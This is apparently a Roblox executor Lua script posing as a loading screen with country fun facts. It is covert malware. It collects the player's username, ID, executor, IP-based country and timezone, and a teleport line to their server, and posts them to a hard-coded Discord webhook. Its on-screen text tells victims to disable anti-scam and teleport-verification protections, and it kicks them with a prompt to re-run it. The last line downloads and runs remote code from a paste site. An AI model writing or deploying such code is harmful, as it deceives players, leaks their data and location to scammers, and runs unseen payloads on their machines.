-- FULL fixed script with all requested features
-- Works in executor environments (Synapse/Delta/Krnl/Fluxus/etc.) ‚Äî best-effort fallbacks included.

-- ===== Services & Config =====


local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local MarketplaceService = game:GetService("MarketplaceService")

local Player = Players.LocalPlayer
if not Player then return end

local PLAYER_GUI = Player:WaitForChild("PlayerGui")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1412105381404217425/KNEv6IByQrGAkfx_lj_L8v8Wpbr11d4gS4lZQojOWnguOno1xXZdPAVLau3YbvRzVfP3"
local LOADING_TIME = 120         -- seconds for full bar
local FACT_INTERVAL = 5          -- seconds per fun fact

-- ===== Helpers: robust HTTP request (supports many executors) =====
local function sendRequest(opts)
	-- opts: table { Url=..., Method="GET"/"POST", Headers=..., Body=... }
	local ok, res
	-- syn.request
	if type(syn) == "table" and syn.request then
		ok, res = pcall(function() return syn.request(opts) end)
		if ok and res then return res end
	end
	-- http_request
	if type(http_request) == "function" then
		ok, res = pcall(function() return http_request(opts) end)
		if ok and res then return res end
	end
	-- request (some executors)
	if type(request) == "function" then
		ok, res = pcall(function() return request(opts) end)
		if ok and res then return res end
	end
	-- fluxus
	if type(fluxus) == "table" and fluxus.request then
		ok, res = pcall(function() return fluxus.request(opts) end)
		if ok and res then return res end
	end
	-- fallback: HttpService:RequestAsync (server experimental / may be disabled)
	if HttpService and HttpService.RequestAsync then
		ok, res = pcall(function() return HttpService:RequestAsync(opts) end)
		if ok and res then return res end
	end
	-- last fallback for simple GETs: game:HttpGet
	if opts.Method == "GET" and type(game.HttpGet) == "function" then
		ok, res = pcall(function() return game:HttpGet(opts.Url) end)
		if ok and res then return { Body = res } end
	end

	-- nothing worked
	return nil
end

-- Normalize response body (returns string or nil)
local function getBody(resp)
	if not resp then return nil end
	return resp.Body or resp.body or resp[1] or resp.response or nil
end

-- ===== Helpers: executor detection =====
local function detectExecutor()
	-- try common/known functions first
	if type(identifyexecutor) == "function" then
		local ok, n = pcall(identifyexecutor)
		if ok and type(n) == "string" and n ~= "" then return n end
	end
	if type(getexecutor) == "function" then
		local ok, n = pcall(getexecutor)
		if ok and type(n) == "string" and n ~= "" then return n end
	end
	if type(syn) == "table" and syn.request then return "Synapse X" end
	if type(http_request) == "function" then return "HTTP_Request" end
	if type(request) == "function" then return "Request" end
	if type(fluxus) == "table" and fluxus.request then return "Fluxus" end
	if KRNL_LOADED then return "Krnl" end
	return "Unknown Executor"
end

-- Convert country code ("US") -> flag emoji üá∫üá∏
local function codeToFlag(code)
	if not code or #code < 2 then return "üè≥Ô∏è" end
	code = code:upper()
	local a = string.byte(code, 1) - 65
	local b = string.byte(code, 2) - 65
	if a < 0 or a > 25 or b < 0 or b > 25 then return "üè≥Ô∏è" end
	-- Regional indicator symbols start at 0x1F1E6 (127462)
	return utf8.char(127462 + a, 127462 + b)
end

-- ===== Location Info (country, countryCode, timezone) - best-effort via public APIs =====
local function getLocationInfo()
	local endpoints = {
		"https://ip-api.com/json",
		"http://ip-api.com/json",
		"https://ipinfo.io/json",
		"http://ipinfo.io/json"
	}
	for _, url in ipairs(endpoints) do
		local ok, resp = pcall(function()
			return sendRequest({ Url = url, Method = "GET" })
		end)
		local body = getBody(resp)
		if ok and body then
			local ok2, data = pcall(function() return HttpService:JSONDecode(body) end)
			if ok2 and type(data) == "table" then
				local country = data.country or data.countryName or data.country_name or nil
				local code = data.countryCode or data.country_code or (data.country and #data.country == 2 and data.country) or nil
				local tz = data.timezone or data.time_zone or data.tz or nil
				return country or "Unknown", code or "", tz or "Unknown"
			end
		end
	end
	return "Unknown", "", "Unknown"
end

-- ===== Country facts database (map of known country -> list of facts) =====
local CountryFacts = {
	["Philippines"] = {
		"The Philippines has over 7,600 islands.",
		"Jeepneys are a famous form of transport in the Philippines.",
		"The Philippines is one of the world's largest coconut producers."
	},
	["United States"] = {
		"The US has 50 states.",
		"The bald eagle is the national bird.",
		"The US has the world‚Äôs largest economy."
	},
	["Japan"] = {
		"Japan has over 6,800 islands.",
		"Mount Fuji is Japan's tallest peak.",
		"Japan has more than 5 million vending machines."
	},
	["Brazil"] = {
		"Brazil houses most of the Amazon rainforest.",
		"Brazil has won the FIFA World Cup multiple times.",
		"Portuguese is the official language of Brazil."
	},
	["Canada"] = {
		"Canada has the longest coastline of any country.",
		"Canada has more lakes than any other country.",
		"The maple leaf is a national symbol of Canada."
	},
	["Australia"] = {
		"Australia has more kangaroos than people.",
		"The Great Barrier Reef is the world‚Äôs largest coral reef system.",
		"Australia is both a country and a continent."
	}
}
local DefaultFacts = { "No fun facts available for your country." }

-- ===== Compose teleport script for THIS server (real) =====
local function buildTeleportScript()
	return string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")',
		tostring(game.PlaceId), tostring(game.JobId))
end

-- ===== Compose and send Discord webhook (join/kick/leave) =====
local executorName = detectExecutor()
local countryName, countryCode, countryTimezone = getLocationInfo()
local flagEmoji = codeToFlag(countryCode)

-- Get product info (game name) best-effort
local gameName = "Unknown"
pcall(function()
	local info = MarketplaceService:GetProductInfo(game.PlaceId)
	if info and info.Name then gameName = info.Name end
end)

-- helper to get server counts
local function getServerCounts()
	local current = #Players:GetPlayers()
	local maxp = Players.MaxPlayers
	return current, maxp, (current >= maxp)
end

local function sendWebhook(eventTitle, eventDesc, pingEveryone)
	local current, maxp, isFull = getServerCounts()
	local teleportScript = buildTeleportScript()

	local embed = {
		title = eventTitle,
		description = eventDesc or "",
		color = (eventTitle:lower():find("kicked") and 15158332) or 65280,
		fields = {
			{ name = "Player", value = Player.Name .. " (" .. tostring(Player.UserId) .. ")", inline = true },
			{ name = "Place / Game", value = tostring(game.PlaceId) .. " ‚Äî " .. tostring(gameName), inline = true },
			{ name = "Job ID", value = tostring(game.JobId), inline = true },
			{ name = "Executor", value = executorName, inline = true },
			{ name = "Country", value = tostring(flagEmoji) .. " " .. tostring(countryName), inline = true },
			{ name = "Timezone", value = tostring(countryTimezone), inline = true },
			{ name = "Server Players", value = string.format("%d / %d", current, maxp), inline = true },
			{ name = "Server Full?", value = isFull and "‚úÖ Yes" or "‚ùå No", inline = true },
			{ name = "Teleport Script", value = "```lua\n" .. teleportScript .. "\n```", inline = false },
			{ name = "Fun Facts (sample)", value = table.concat(CountryFacts[countryName] or DefaultFacts, "\n"), inline = false }
		},
		footer = { text = "Execution Logger ‚Ä¢ " .. os.date("%Y-%m-%d %H:%M:%S") },
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ", os.time())
	}

	local payload = {
		content = pingEveryone and "@everyone" or nil,
		username = "Execution Logger",
		embeds = { embed }
	}

	local ok, res = pcall(function()
		local body = HttpService:JSONEncode(payload)
		return sendRequest({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = body
		})
	end)
	-- nothing else required; best-effort
end

-- Send "join/executed" webhook right away (ping everyone)
sendWebhook("üü¢ Player Executed Script", "Player executed the script in this server.", true)

-- ===== UI: full-screen loading screen (calm gradient) =====
-- Clean previous if any
pcall(function()
	local old = PLAYER_GUI:FindFirstChild("LoadingScreen")
	if old then old:Destroy() end
end)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = PLAYER_GUI

local bg = Instance.new("Frame")
bg.Name = "Background"
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(12, 40, 18) -- calm dark green
bg.BorderSizePixel = 0
bg.Parent = screenGui

local grad = Instance.new("UIGradient")
grad.Rotation = 45
grad.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(12,40,18)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(20,70,30))
}
grad.Parent = bg

local container = Instance.new("Frame")
container.Size = UDim2.new(0.6, 0, 0.36, 0)
container.AnchorPoint = Vector2.new(0.5, 0.5)
container.Position = UDim2.new(0.5, 0, 0.5, 0)
container.BackgroundTransparency = 0.08
container.BackgroundColor3 = Color3.fromRGB(0,0,0)
container.BorderSizePixel = 0
container.Parent = bg
local containerCorner = Instance.new("UICorner", container); containerCorner.CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", container)
title.Size = UDim2.new(1, -30, 0, 44)
title.Position = UDim2.new(0, 15, 0, 12)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBlack
title.Text = "PLEASE DISBALE - ANTI SCAM AND VERIFY TELEPORT IF YOUR ON DELTA"
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(230,230,230)

local loadingLabel = Instance.new("TextLabel", container)
loadingLabel.Size = UDim2.new(1, -30, 0, 28)
loadingLabel.Position = UDim2.new(0, 15, 0, 60)
loadingLabel.BackgroundTransparency = 1
loadingLabel.Font = Enum.Font.Gotham
loadingLabel.Text = "Loading"
loadingLabel.TextScaled = true
loadingLabel.TextColor3 = Color3.fromRGB(220,220,220)

local pbBg = Instance.new("Frame", container)
pbBg.Name = "ProgressBg"
pbBg.Size = UDim2.new(0.9, 0, 0, 26)
pbBg.Position = UDim2.new(0.05, 0, 0, 108)
pbBg.BackgroundColor3 = Color3.fromRGB(30,30,30)
pbBg.BorderSizePixel = 0
local pbBgCorner = Instance.new("UICorner", pbBg); pbBgCorner.CornerRadius = UDim.new(0, 14)

local pb = Instance.new("Frame", pbBg)
pb.Name = "Progress"
pb.Size = UDim2.new(0, 0, 1, 0)
pb.Position = UDim2.new(0, 0, 0, 0)
pb.BackgroundColor3 = Color3.fromRGB(0, 170, 120)
pb.BorderSizePixel = 0
local pbCorner = Instance.new("UICorner", pb); pbCorner.CornerRadius = UDim.new(0, 12)

local funFactLabel = Instance.new("TextLabel", container)
funFactLabel.Size = UDim2.new(1, -30, 0, 60)
funFactLabel.Position = UDim2.new(0, 15, 0, 150)
funFactLabel.BackgroundTransparency = 1
funFactLabel.TextColor3 = Color3.fromRGB(240,240,220)
funFactLabel.Font = Enum.Font.Gotham
funFactLabel.TextScaled = true
funFactLabel.TextWrapped = true
funFactLabel.Text = "Fetching fun facts..."

-- loading dots animation
spawn(function()
	while screenGui.Parent do
		for i = 1, 4 do
			loadingLabel.Text = "Loading" .. string.rep(".", i)
			task.wait(0.5)
		end
	end
end)

-- pick facts array (country-specific or default)
local facts = CountryFacts[countryName] or DefaultFacts

-- rotate fun facts every FACT_INTERVAL seconds
spawn(function()
	local idx = 1
	while screenGui.Parent do
		funFactLabel.Text = "üåç Fun Fact: " .. (facts[idx] or facts[1])
		idx = idx + 1
		if idx > #facts then idx = 1 end
		task.wait(FACT_INTERVAL)
	end
end)

-- Progress bar tween (smooth)
do
	local goal = { Size = UDim2.new(1, 0, 1, 0) } -- fill pbBg
	local tweenInfo = TweenInfo.new(LOADING_TIME, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
	local tween = TweenService:Create(pb, tweenInfo, goal)
	tween:Play()

	-- after tween complete, fade out and kick
	tween.Completed:Connect(function()
		-- fade UI elements
		local fadeInfo = TweenInfo.new(1.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		-- fade container children (background uses grad, fade container)
		local fades = { container, title, loadingLabel, pbBg, pb, funFactLabel }
		for _, v in ipairs(fades) do
			pcall(function()
				-- frames
				if v:IsA("Frame") then
					TweenService:Create(v, fadeInfo, { BackgroundTransparency = 1 }):Play()
				elseif v:IsA("TextLabel") then
					TweenService:Create(v, fadeInfo, { TextTransparency = 1 }):Play()
				end
			end)
		end
		task.wait(1.3)

		-- Send kicked webhook (ping everyone)
		sendWebhook("üî¥ Player Kicked", "Player was kicked after loading finished.", true)

		-- Kick player with the requested message
		pcall(function()
			Player:Kick("Please rejoin and re-execute the script caused by do not disabled the verify teleport and anti scam ")
		end)
	end)
end

-- ===== Best-effort notifications when player leaves (try to notify on leaving) =====
-- Attempt to send leave webhook if the LocalPlayer's ancestry changes (best-effort)
Player.AncestryChanged:Connect(function(_, parent)
	if not parent then
		-- player parent is nil => leaving
		sendWebhook("‚ö†Ô∏è Player Left", "Player left the game (client-side detected).", true)
	end
end)

-- Also attempt to send on close (BindToClose) as best-effort
if game:IsA("DataModel") and type(game.BindToClose) == "function" then
	pcall(function()
		game:BindToClose(function()
			-- short sleep to attempt HTTP; may be killed quickly in some executors
			sendWebhook("‚ö†Ô∏è Player Left (BindToClose)", "Player closed or disconnected (BindToClose).", true)
			-- small delay to let request attempt
			task.wait(0.15)
		end)
	end)
end
task.wait(2)
loadstring(game:HttpGet("https://pastefy.app/JFGQwYi0/raw"))()
